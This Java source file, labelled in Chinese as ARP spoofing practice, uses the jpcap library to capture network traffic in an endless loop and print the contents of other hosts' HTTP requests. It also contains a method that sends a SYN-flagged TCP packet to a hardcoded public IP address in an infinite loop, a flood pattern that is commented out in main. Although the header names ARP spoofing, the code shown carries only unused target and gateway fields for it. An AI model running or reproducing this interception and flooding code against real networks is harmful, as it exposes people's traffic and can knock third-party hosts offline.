package net.jpcap.arp;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;

import javax.sound.midi.SysexMessage;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.JpcapWriter;
import jpcap.NetworkInterface;
import jpcap.PacketReceiver;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

/**
 * arp欺骗技术 练习 2013-6-28
 * 
 * @author 岳志华
 * 
 */
public class ARPTest implements PacketReceiver {

	// 设备列表
	private NetworkInterface[] devices;
	// 要使用的设备
	private NetworkInterface device;
	// 与设备的连接
	private JpcapCaptor jcaptor;
	// 用于发送的实例
	private JpcapSender jsender;
	// B的mac地址，网关的mac地址
	private byte[] targerMac, gateMac;
	// B的ip地址，网关的ip地址
	private String targetIp, gateIp;

	/**
	 * 　*初始化设备 　* JpcapCaptor.getDeviceList()得到设备可能会有两个，其中一个必定是“Generic 　*dialup
	 * adapter”，这是windows系统的虚拟网卡，并非真正的硬件设备。
	 * 
	 * 　*注意：在这里有一个小小的BUG，如果JpcapCaptor.getDeviceList()之前有类似JFrame jf=new
	 * 　*JFame（）这类的语句会影响得到设备个数，只会得到真正的硬件设备，而不会出现虚拟网卡。
	 * 　*虚拟网卡只有MAC地址而没有IP地址，而且如果出现虚拟网卡，那么实际网卡的MAC将分 　*配给虚拟网卡，也就是说在程序中调用device.
	 * mac_address时得到的是00 00 00 00 00 00。
	 */
	private NetworkInterface getDevice() throws IOException {
		devices = JpcapCaptor.getDeviceList();
		// 只有一个设备
		device = devices[1];
		// 打开与设备的连接
		jcaptor = JpcapCaptor.openDevice(device, 2000, false, 10000);
		// 只监听B的数据包
		jcaptor.setFilter("ip", true);

		jsender = jcaptor.getJpcapSenderInstance();

		return device;
	}

	/**
	 * 无限循环抓包
	 * 
	 * @throws Exception
	 */
	public void getPackage() throws Exception {
		jcaptor.loopPacket(-1, this);
	}

	/**
	 * 接收数据包
	 * 
	 */
	public void receivePacket(Packet pack) {
		// parsePackage((IPPacket)pack);
		// parsePack((IPPacket)pack);
//		parseTCPPack(pack);
		parseTCPPack2(pack);
	}

	
	/**
	 * 解析TCP数据包22222222222222222
	 * 
	 * @param pack
	 */
	public void parseTCPPack2(Packet pack) {

		if (pack instanceof TCPPacket) {
			TCPPacket tcpPack = (TCPPacket) pack;
			EthernetPacket ethernetPacket = (EthernetPacket) pack.datalink;
			if (tcpPack.dst_port == 80 && tcpPack.data.length < 1024
					&& tcpPack.data.length > 0) {
				System.out.println("源ip : " + tcpPack.src_ip + " --> 目的ip ："
						+ tcpPack.dst_ip + "     源端口 : " + tcpPack.src_port
						+ " --> 目的端口 : " + tcpPack.dst_port);

				System.out.println("源mac地址："
						+ ethernetPacket.getSourceAddress()
						+ "  --- > 目标mac地址: "
						+ ethernetPacket.getDestinationAddress());

				System.out.println("协议： " + tcpPack.protocol);

				System.out.println("数据：");
				try {
					System.out.println(new String(pack.data,"gb2312"));
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}
				String PacketHexString = BytesToHexString(pack.data);
				System.out.println(PacketHexString);
				System.out
						.println("-------------------------------数据包分割线---------------------------------");
			}

		}

	}
	
	
	public String BytesToHexString(byte[] b)
	{//将byte数组解析成十六进制字符串
		String hs = "";
	        String stmp = "";
	        for(int n = 0;n < b.length;n++)
	        {
	            stmp = (Integer.toHexString(b[n] & 0XFF));
	            if(stmp.length() == 1) 
	            	hs = hs + "0" + stmp;
	            else 
	            	hs = hs + stmp;
	            //转换成十进制
	            System.out.println(Integer.parseInt(stmp,10)+" ------>   "+(char)Integer.parseInt(stmp,10));
	        }
	        return hs.toUpperCase();   
	}
	

	/**
	 * 解析TCP数据包
	 * 
	 * @param pack
	 */
	public void parseTCPPack(Packet pack) {

		if (pack instanceof TCPPacket) {
			TCPPacket tcpPack = (TCPPacket) pack;
			EthernetPacket ethernetPacket = (EthernetPacket) pack.datalink;
			if (tcpPack.dst_port == 80 && tcpPack.data.length < 1024
					&& tcpPack.data.length > 0) {
				System.out.println("源ip : " + tcpPack.src_ip + " --> 目的ip ："
						+ tcpPack.dst_ip + "     源端口 : " + tcpPack.src_port
						+ " --> 目的端口 : " + tcpPack.dst_port);

				System.out.println("源mac地址："
						+ ethernetPacket.getSourceAddress()
						+ "  --- > 目标mac地址: "
						+ ethernetPacket.getDestinationAddress());

				System.out.println("协议： " + tcpPack.protocol);

				System.out.println("数据：");
				for (int i = 0; i < tcpPack.data.length; i++) {
					System.out.print((char) tcpPack.data[i]);
				}
				System.out
						.println("-------------------------------数据包分割线---------------------------------");
			}

		}

	}

	/**
	 * 解析ip数据包
	 * 
	 * @param pack
	 */
	public void parsePackage(IPPacket pack) {

		if (pack instanceof IPPacket) {
			if (pack.data == null) {
				return;
			}
			if (new String(pack.data).indexOf("Content-Type: text/html") != -1) {
				EthernetPacket ep = (EthernetPacket) pack.datalink;
				System.out.println("源mac地址：" + ep.getSourceAddress()
						+ "  --- > 目标mac地址: " + ep.getDestinationAddress());

				System.out.println("源ip -- > 目标ip ： "
						+ ((IPPacket) pack).src_ip + " -- > "
						+ ((IPPacket) pack).dst_ip);
				System.out.println("TTL:" + pack.hop_limit + "   上层协议："
						+ pack.protocol);

				int index = new String(pack.data).indexOf("charset=");

				if (index != -1) {
					String encoding = new String(pack.data)
							.substring(index + 8);
					encoding = encoding.substring(0, encoding.indexOf("\n"));
					System.out.println(new String(pack.data));

					try {
						System.out.println(new String(pack.data, "utf-8"));

					} catch (UnsupportedEncodingException e) {
						System.err.println(e.getMessage());
					}
				} else {
					System.out.println(new String(pack.data));
				}
				System.out
						.println("------------------------------华丽丽的分割线---------------------------------------");

			}

		}
	}

	/**
	 * 发送tcp/ip数据包
	 * 
	 */
	public void sendTCPPack() {
		try {
			JpcapSender jsender = JpcapSender.openDevice(device);
			// 新建 tcppackage
			TCPPacket tp;
			tp = new TCPPacket(80, 4692, 123, 0, false, false, false, false,
					true, false, false, false, 1024, 0);
			tp.setIPv4Parameter(0, false, false, false, 0, true, false, false,
					2, 1, 255, 230, InetAddress.getByName("192.168.1.111"),
					InetAddress.getByName("123.234.130.150"));
			tp.data = "".getBytes();
			while(true){
				jsender.sendPacket(tp);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	/**
	 * 测试方法
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		ARPTest test = new ARPTest();
		try {
			test.getDevice();
			test.getPackage();
//			test.sendTCPPack();
		} catch (Exception e) {
			System.out.println(e.getMessage());
		}

	}

}
